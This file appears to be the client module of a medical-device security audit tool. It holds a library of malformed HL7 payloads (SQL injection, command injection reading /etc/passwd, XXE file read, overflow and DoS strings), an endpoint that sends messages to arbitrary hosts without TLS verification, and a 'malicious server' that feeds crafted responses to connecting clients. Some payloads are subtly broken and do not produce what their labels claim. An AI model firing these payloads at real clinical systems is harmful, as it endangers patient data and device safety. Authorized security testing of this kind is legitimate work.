"""
HL7 Client API for Medaudit Web Application.
Provides real-time interaction with medical devices and malformed payload library.
"""

import socket
import ssl
from datetime import datetime
from typing import Optional, List, Dict, Any
from fastapi import APIRouter, Depends, HTTPException, WebSocket, WebSocketDisconnect
from pydantic import BaseModel
from sqlalchemy.orm import Session
import asyncio
import json

from .database import get_db, Project, ClientSession, User
from .auth import require_auth, get_session_token

router = APIRouter(prefix="/api/client", tags=["client"])

# MLLP framing
MLLP_START = b'\x0b'
MLLP_END = b'\x1c\x0d'


# ============== Malformed Payload Library ==============

MALFORMED_PAYLOADS = {
    "buffer_overflow": {
        "name": "Buffer Overflow Tests",
        "description": "Test for buffer overflow vulnerabilities",
        "payloads": [
            {
                "id": "long_field",
                "name": "Long Field Value",
                "description": "Extremely long value in PID segment",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||{'A' * 10000}||{'B' * 5000}^^^||19800101|M"
            },
            {
                "id": "long_segment",
                "name": "Long Segment",
                "description": "Very long MSH segment",
                "message": "MSH|^~\\&|" + "A" * 50000 + "|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5"
            },
            {
                "id": "many_segments",
                "name": "Many Segments",
                "description": "Message with excessive number of segments",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\r" + "\r".join([f"NTE|{i}|Comment {i}" for i in range(1000)])
            }
        ]
    },
    "format_string": {
        "name": "Format String Attacks",
        "description": "Test for format string vulnerabilities",
        "payloads": [
            {
                "id": "printf_n",
                "name": "Printf %n Attack",
                "description": "Format string with %n specifier",
                "message": "MSH|^~\\&|%n%n%n%n|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||%x%x%x%x||%s%s%s%s^^^"
            },
            {
                "id": "printf_s",
                "name": "Printf %s Attack",
                "description": "Format string with %s specifier",
                "message": "MSH|^~\\&|TEST|%s%s%s%s%s|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5"
            }
        ]
    },
    "sql_injection": {
        "name": "SQL Injection",
        "description": "Test for SQL injection in HL7 fields",
        "payloads": [
            {
                "id": "basic_sqli",
                "name": "Basic SQL Injection",
                "description": "Simple SQL injection in patient ID",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||' OR '1'='1||DOE^JOHN^^^||19800101|M"
            },
            {
                "id": "union_sqli",
                "name": "UNION SQL Injection",
                "description": "UNION-based SQL injection",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||1' UNION SELECT * FROM users--||DOE^JOHN^^^||19800101|M"
            },
            {
                "id": "stacked_sqli",
                "name": "Stacked Queries",
                "description": "Stacked SQL queries",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||1'; DROP TABLE patients;--||DOE^JOHN^^^||19800101|M"
            }
        ]
    },
    "command_injection": {
        "name": "Command Injection",
        "description": "Test for OS command injection",
        "payloads": [
            {
                "id": "basic_cmd",
                "name": "Basic Command Injection",
                "description": "Simple command injection",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||123; ls -la||DOE^JOHN^^^||19800101|M"
            },
            {
                "id": "pipe_cmd",
                "name": "Pipe Command",
                "description": "Pipe-based command injection",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||123 | cat /etc/passwd||DOE^JOHN^^^||19800101|M"
            },
            {
                "id": "backtick_cmd",
                "name": "Backtick Command",
                "description": "Backtick command injection",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||`id`||DOE^JOHN^^^||19800101|M"
            }
        ]
    },
    "xxe": {
        "name": "XXE Attacks",
        "description": "XML External Entity attacks (if XML parsing is used)",
        "payloads": [
            {
                "id": "xxe_file",
                "name": "XXE File Read",
                "description": "Read local file via XXE",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>||DOE^JOHN^^^||19800101|M"
            }
        ]
    },
    "null_bytes": {
        "name": "Null Byte Injection",
        "description": "Test for null byte handling issues",
        "payloads": [
            {
                "id": "null_in_field",
                "name": "Null in Field",
                "description": "Null byte in patient name",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||123||DOE\\x00INJECTED^JOHN^^^||19800101|M"
            },
            {
                "id": "null_truncate",
                "name": "Null Truncation",
                "description": "Null byte to truncate processing",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\\x00IGNORE_REST"
            }
        ]
    },
    "encoding": {
        "name": "Encoding Attacks",
        "description": "Test character encoding handling",
        "payloads": [
            {
                "id": "unicode_overflow",
                "name": "Unicode Overflow",
                "description": "Unicode characters that may cause issues",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||123||" + "\\u0000" * 100 + "||19800101|M"
            },
            {
                "id": "utf8_invalid",
                "name": "Invalid UTF-8",
                "description": "Invalid UTF-8 sequences",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||123||\\xff\\xfe||19800101|M"
            }
        ]
    },
    "protocol_violations": {
        "name": "HL7 Protocol Violations",
        "description": "Test HL7 protocol parsing edge cases",
        "payloads": [
            {
                "id": "missing_msh",
                "name": "Missing MSH",
                "description": "Message without MSH segment",
                "message": "PID|1||123||DOE^JOHN^^^||19800101|M"
            },
            {
                "id": "wrong_delimiters",
                "name": "Wrong Delimiters",
                "description": "Message with incorrect delimiters",
                "message": "MSH;^~\\&;TEST;TEST;TEST;TEST;{timestamp};;ADT^A01;{msg_id};P;2.5"
            },
            {
                "id": "empty_message",
                "name": "Empty Message",
                "description": "Empty HL7 message",
                "message": ""
            },
            {
                "id": "only_msh",
                "name": "Only MSH",
                "description": "Message with only MSH segment",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5"
            },
            {
                "id": "duplicate_msh",
                "name": "Duplicate MSH",
                "description": "Message with multiple MSH segments",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rMSH|^~\\&|EVIL|EVIL|EVIL|EVIL|{timestamp}||ADT^A01|{msg_id}|P|2.5"
            },
            {
                "id": "negative_values",
                "name": "Negative Values",
                "description": "Negative numbers in numeric fields",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|-1||-99999||DOE^JOHN^^^||-19800101|M"
            }
        ]
    },
    "timing": {
        "name": "Timing/DoS Attacks",
        "description": "Test for denial of service vulnerabilities",
        "payloads": [
            {
                "id": "deep_nesting",
                "name": "Deep Component Nesting",
                "description": "Deeply nested HL7 components",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||" + "^" * 1000 + "||DOE^JOHN^^^||19800101|M"
            },
            {
                "id": "regex_dos",
                "name": "ReDoS Pattern",
                "description": "Pattern that may cause regex DoS",
                "message": "MSH|^~\\&|TEST|TEST|TEST|TEST|{timestamp}||ADT^A01|{msg_id}|P|2.5\rPID|1||" + "a" * 50 + "!||DOE^JOHN^^^||19800101|M"
            }
        ]
    }
}

# Standard HL7 message templates
HL7_TEMPLATES = {
    "adt_a01": {
        "name": "ADT^A01 - Patient Admission",
        "message": """MSH|^~\\&|SENDING_APP|SENDING_FAC|RECEIVING_APP|RECEIVING_FAC|{timestamp}||ADT^A01|{msg_id}|P|2.5
PID|1||{patient_id}||{patient_name}^^^||{dob}|{sex}|||{address}||{phone}
PV1|1|I|{location}||||{attending_doctor}|||MED||||||||{visit_number}"""
    },
    "adt_a08": {
        "name": "ADT^A08 - Patient Update",
        "message": """MSH|^~\\&|SENDING_APP|SENDING_FAC|RECEIVING_APP|RECEIVING_FAC|{timestamp}||ADT^A08|{msg_id}|P|2.5
PID|1||{patient_id}||{patient_name}^^^||{dob}|{sex}|||{address}||{phone}"""
    },
    "orm_o01": {
        "name": "ORM^O01 - Order Message",
        "message": """MSH|^~\\&|SENDING_APP|SENDING_FAC|RECEIVING_APP|RECEIVING_FAC|{timestamp}||ORM^O01|{msg_id}|P|2.5
PID|1||{patient_id}||{patient_name}^^^||{dob}|{sex}
ORC|NW|{order_id}|||CM
OBR|1|{order_id}||{test_code}^{test_name}|||{timestamp}"""
    },
    "oru_r01": {
        "name": "ORU^R01 - Observation Result",
        "message": """MSH|^~\\&|SENDING_APP|SENDING_FAC|RECEIVING_APP|RECEIVING_FAC|{timestamp}||ORU^R01|{msg_id}|P|2.5
PID|1||{patient_id}||{patient_name}^^^||{dob}|{sex}
OBR|1|{order_id}||{test_code}^{test_name}|||{timestamp}
OBX|1|NM|{result_code}^{result_name}||{result_value}|{result_units}|{reference_range}|N|||F"""
    }
}


class HL7SendRequest(BaseModel):
    """Request to send an HL7 message."""
    target_host: str
    target_port: int = 2575
    use_tls: bool = False
    message: str
    timeout: int = 30


class ClientSessionCreate(BaseModel):
    """Create a client session."""
    target_host: str
    target_port: int = 2575
    use_tls: bool = False


def format_message(template: str, **kwargs) -> str:
    """Format an HL7 message template with provided values."""
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    msg_id = f"MSG{datetime.now().strftime('%Y%m%d%H%M%S%f')}"
    
    defaults = {
        "timestamp": timestamp,
        "msg_id": msg_id,
        "patient_id": "12345",
        "patient_name": "DOE^JOHN^^^",
        "dob": "19800101",
        "sex": "M",
        "address": "123 Main St^^City^ST^12345",
        "phone": "555-0100",
        "location": "WARD^101^1",
        "attending_doctor": "1234^SMITH^ALICE",
        "visit_number": "V12345",
        "order_id": "ORD12345",
        "test_code": "CBC",
        "test_name": "Complete Blood Count",
        "result_code": "WBC",
        "result_name": "White Blood Cell Count",
        "result_value": "7.5",
        "result_units": "10*3/uL",
        "reference_range": "4.5-11.0"
    }
    
    defaults.update(kwargs)
    
    # Handle special characters in malformed payloads
    result = template
    for key, value in defaults.items():
        result = result.replace("{" + key + "}", str(value))
    
    # Convert \r\n or \n to \r for HL7
    result = result.replace("\n", "\r")
    
    return result


def send_hl7_message(host: str, port: int, message: str, use_tls: bool = False, timeout: int = 30) -> Dict[str, Any]:
    """Send an HL7 message and receive response."""
    try:
        # Wrap message in MLLP
        mllp_message = MLLP_START + message.encode('utf-8') + MLLP_END
        
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        if use_tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
        
        # Connect and send
        start_time = datetime.now()
        sock.connect((host, port))
        sock.sendall(mllp_message)
        
        # Receive response
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if MLLP_END in response:
                    break
            except socket.timeout:
                break
        
        end_time = datetime.now()
        sock.close()
        
        # Parse response
        response_text = ""
        if response:
            if response.startswith(MLLP_START):
                response = response[1:]
            end_idx = response.find(MLLP_END)
            if end_idx > 0:
                response = response[:end_idx]
            response_text = response.decode('utf-8', errors='ignore')
        
        return {
            "success": True,
            "response": response_text,
            "response_time_ms": int((end_time - start_time).total_seconds() * 1000),
            "timestamp": datetime.now().isoformat()
        }
        
    except socket.timeout:
        return {
            "success": False,
            "error": "Connection timed out",
            "timestamp": datetime.now().isoformat()
        }
    except ConnectionRefusedError:
        return {
            "success": False,
            "error": "Connection refused - is the server running?",
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "timestamp": datetime.now().isoformat()
        }


@router.get("/payloads")
async def get_payload_library(user: User = Depends(require_auth)):
    """Get the malformed payload library."""
    return {"payloads": MALFORMED_PAYLOADS}


@router.get("/templates")
async def get_message_templates(user: User = Depends(require_auth)):
    """Get standard HL7 message templates."""
    return {"templates": HL7_TEMPLATES}


@router.post("/send")
async def send_message(
    request: HL7SendRequest,
    user: User = Depends(require_auth),
    db: Session = Depends(get_db)
):
    """Send an HL7 message to a target device."""
    # Format the message (replace placeholders)
    formatted_message = format_message(request.message)
    
    # Send and get response
    result = send_hl7_message(
        host=request.target_host,
        port=request.target_port,
        message=formatted_message,
        use_tls=request.use_tls,
        timeout=request.timeout
    )
    
    result["sent_message"] = formatted_message
    return result


@router.post("/projects/{project_id}/sessions")
async def create_client_session(
    project_id: str,
    session_data: ClientSessionCreate,
    user: User = Depends(require_auth),
    db: Session = Depends(get_db)
):
    """Create a new client session for a project."""
    project = db.query(Project).filter(
        Project.id == project_id,
        Project.owner_id == user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Project not found")
    
    session = ClientSession(
        project_id=project_id,
        target_host=session_data.target_host,
        target_port=session_data.target_port,
        use_tls=session_data.use_tls
    )
    
    db.add(session)
    db.commit()
    db.refresh(session)
    
    return {"success": True, "session": session.to_dict()}


@router.get("/projects/{project_id}/sessions")
async def list_client_sessions(
    project_id: str,
    user: User = Depends(require_auth),
    db: Session = Depends(get_db)
):
    """List client sessions for a project."""
    project = db.query(Project).filter(
        Project.id == project_id,
        Project.owner_id == user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Project not found")
    
    return {"sessions": [s.to_dict() for s in project.client_sessions]}


@router.get("/projects/{project_id}/sessions/{session_id}/history")
async def get_session_history(
    project_id: str,
    session_id: str,
    user: User = Depends(require_auth),
    db: Session = Depends(get_db)
):
    """Get message history for a client session."""
    session = db.query(ClientSession).filter(
        ClientSession.id == session_id,
        ClientSession.project_id == project_id
    ).first()
    
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    # Verify project ownership
    project = db.query(Project).filter(
        Project.id == project_id,
        Project.owner_id == user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Project not found")
    
    return {
        "session": session.to_dict(),
        "history": session.message_history or []
    }


@router.post("/projects/{project_id}/sessions/{session_id}/send")
async def send_via_session(
    project_id: str,
    session_id: str,
    request: HL7SendRequest,
    user: User = Depends(require_auth),
    db: Session = Depends(get_db)
):
    """Send a message via an existing session and log it."""
    session = db.query(ClientSession).filter(
        ClientSession.id == session_id,
        ClientSession.project_id == project_id
    ).first()
    
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")
    
    # Verify project ownership
    project = db.query(Project).filter(
        Project.id == project_id,
        Project.owner_id == user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Project not found")
    
    # Format and send message
    formatted_message = format_message(request.message)
    result = send_hl7_message(
        host=session.target_host,
        port=session.target_port,
        message=formatted_message,
        use_tls=session.use_tls,
        timeout=request.timeout
    )
    
    # Log to session history
    session.add_message(
        direction="sent",
        message=formatted_message,
        response=result.get("response"),
        error=result.get("error")
    )
    db.commit()
    
    result["sent_message"] = formatted_message
    return result


# ============== Malicious Server (Send to Clients) ==============

import threading
import time

# Global state for malicious server
_malicious_server = {
    "server": None,
    "thread": None,
    "running": False,
    "port": None,
    "client_count": 0,
    "queued_response": None,
    "events": [],
    "lock": threading.Lock()
}


class MaliciousHL7Server:
    """A malicious HL7 server that sends crafted responses to clients."""
    
    def __init__(self, port: int, use_tls: bool = False):
        self.port = port
        self.use_tls = use_tls
        self.running = False
        self.server_socket = None
        self.clients = []
        self.queued_response = None
        
    def start(self):
        """Start the malicious server."""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind(('0.0.0.0', self.port))
        self.server_socket.listen(5)
        self.server_socket.settimeout(1.0)
        self.running = True
        
        with _malicious_server["lock"]:
            _malicious_server["events"].append({
                "type": "server_started",
                "port": self.port,
                "timestamp": datetime.now().isoformat()
            })
        
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                client_id = f"{client_address[0]}:{client_address[1]}"
                
                with _malicious_server["lock"]:
                    _malicious_server["client_count"] += 1
                    _malicious_server["events"].append({
                        "type": "client_connected",
                        "client": client_id,
                        "timestamp": datetime.now().isoformat()
                    })
                
                # Handle client in thread
                thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, client_id),
                    daemon=True
                )
                thread.start()
                
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    with _malicious_server["lock"]:
                        _malicious_server["events"].append({
                            "type": "error",
                            "error": str(e),
                            "timestamp": datetime.now().isoformat()
                        })
    
    def _handle_client(self, client_socket, client_id):
        """Handle a connected client - receive message and send malicious response."""
        try:
            client_socket.settimeout(30.0)
            
            # Receive client's message
            buffer = b""
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                buffer += data
                
                # Check for MLLP end
                if MLLP_END in buffer:
                    break
            
            # Log received message
            if buffer:
                message = buffer.decode('utf-8', errors='replace')
                # Strip MLLP framing
                if message.startswith('\x0b'):
                    message = message[1:]
                if message.endswith('\x1c\r'):
                    message = message[:-2]
                
                with _malicious_server["lock"]:
                    _malicious_server["events"].append({
                        "type": "message_received",
                        "client": client_id,
                        "message": message[:200],
                        "timestamp": datetime.now().isoformat()
                    })
            
            # Send queued malicious response or default ACK
            response = _malicious_server.get("queued_response")
            if response:
                # Send the queued malicious response
                formatted = format_message(response)
                mllp_response = MLLP_START + formatted.encode('utf-8') + MLLP_END
                client_socket.sendall(mllp_response)
                
                with _malicious_server["lock"]:
                    _malicious_server["events"].append({
                        "type": "response_sent",
                        "client": client_id,
                        "message": formatted[:100],
                        "malicious": True,
                        "timestamp": datetime.now().isoformat()
                    })
            else:
                # Send a normal ACK if no queued response
                ack = self._generate_ack(buffer.decode('utf-8', errors='replace'))
                mllp_ack = MLLP_START + ack.encode('utf-8') + MLLP_END
                client_socket.sendall(mllp_ack)
                
        except Exception as e:
            with _malicious_server["lock"]:
                _malicious_server["events"].append({
                    "type": "error",
                    "client": client_id,
                    "error": str(e),
                    "timestamp": datetime.now().isoformat()
                })
        finally:
            try:
                client_socket.close()
            except:
                pass
            
            with _malicious_server["lock"]:
                _malicious_server["client_count"] = max(0, _malicious_server["client_count"] - 1)
    
    def _generate_ack(self, message: str) -> str:
        """Generate a standard ACK response."""
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        msg_id = f"ACK{timestamp}"
        return f"MSH|^~\\&|MEDAUDIT|MALICIOUS|CLIENT|DEVICE|{timestamp}||ACK|{msg_id}|P|2.5\rMSA|AA|{msg_id}"
    
    def stop(self):
        """Stop the server."""
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        self.server_socket = None


@router.post("/malicious-server/start")
async def start_malicious_server(
    request: dict,
    user: User = Depends(require_auth)
):
    """Start a malicious HL7 server that sends crafted responses."""
    global _malicious_server
    
    if _malicious_server["running"]:
        raise HTTPException(status_code=400, detail="Malicious server already running")
    
    port = request.get("port", 2575)
    use_tls = request.get("use_tls", False)
    
    try:
        server = MaliciousHL7Server(port=port, use_tls=use_tls)
        
        # Start in background thread
        thread = threading.Thread(target=server.start, daemon=True)
        thread.start()
        
        # Wait briefly to check if started
        time.sleep(0.3)
        
        with _malicious_server["lock"]:
            _malicious_server["server"] = server
            _malicious_server["thread"] = thread
            _malicious_server["running"] = True
            _malicious_server["port"] = port
            _malicious_server["client_count"] = 0
            _malicious_server["events"] = []
        
        return {
            "success": True,
            "server_id": "malicious-server",
            "port": port
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/malicious-server/stop")
async def stop_malicious_server(user: User = Depends(require_auth)):
    """Stop the malicious HL7 server."""
    global _malicious_server
    
    if _malicious_server["server"]:
        _malicious_server["server"].stop()
    
    with _malicious_server["lock"]:
        _malicious_server["server"] = None
        _malicious_server["thread"] = None
        _malicious_server["running"] = False
        _malicious_server["port"] = None
        _malicious_server["queued_response"] = None
    
    # Give time for socket to close
    time.sleep(0.3)
    
    return {"success": True}


@router.get("/malicious-server/status")
async def get_malicious_server_status(user: User = Depends(require_auth)):
    """Get status of the malicious server."""
    with _malicious_server["lock"]:
        # Get and clear events
        events = _malicious_server["events"][-20:]  # Last 20 events
        _malicious_server["events"] = []
        
        return {
            "running": _malicious_server["running"],
            "port": _malicious_server["port"],
            "client_count": _malicious_server["client_count"],
            "has_queued_response": _malicious_server["queued_response"] is not None,
            "events": events
        }


@router.post("/malicious-server/queue-response")
async def queue_malicious_response(
    request: dict,
    user: User = Depends(require_auth)
):
    """Queue a malicious response to send to the next connecting client."""
    global _malicious_server
    
    if not _malicious_server["running"]:
        raise HTTPException(status_code=400, detail="Malicious server not running")
    
    message = request.get("message", "")
    if not message:
        raise HTTPException(status_code=400, detail="Message is required")
    
    with _malicious_server["lock"]:
        _malicious_server["queued_response"] = message
        _malicious_server["events"].append({
            "type": "response_queued",
            "message": message[:100],
            "timestamp": datetime.now().isoformat()
        })
    
    return {"success": True, "message": "Response queued for next client"}
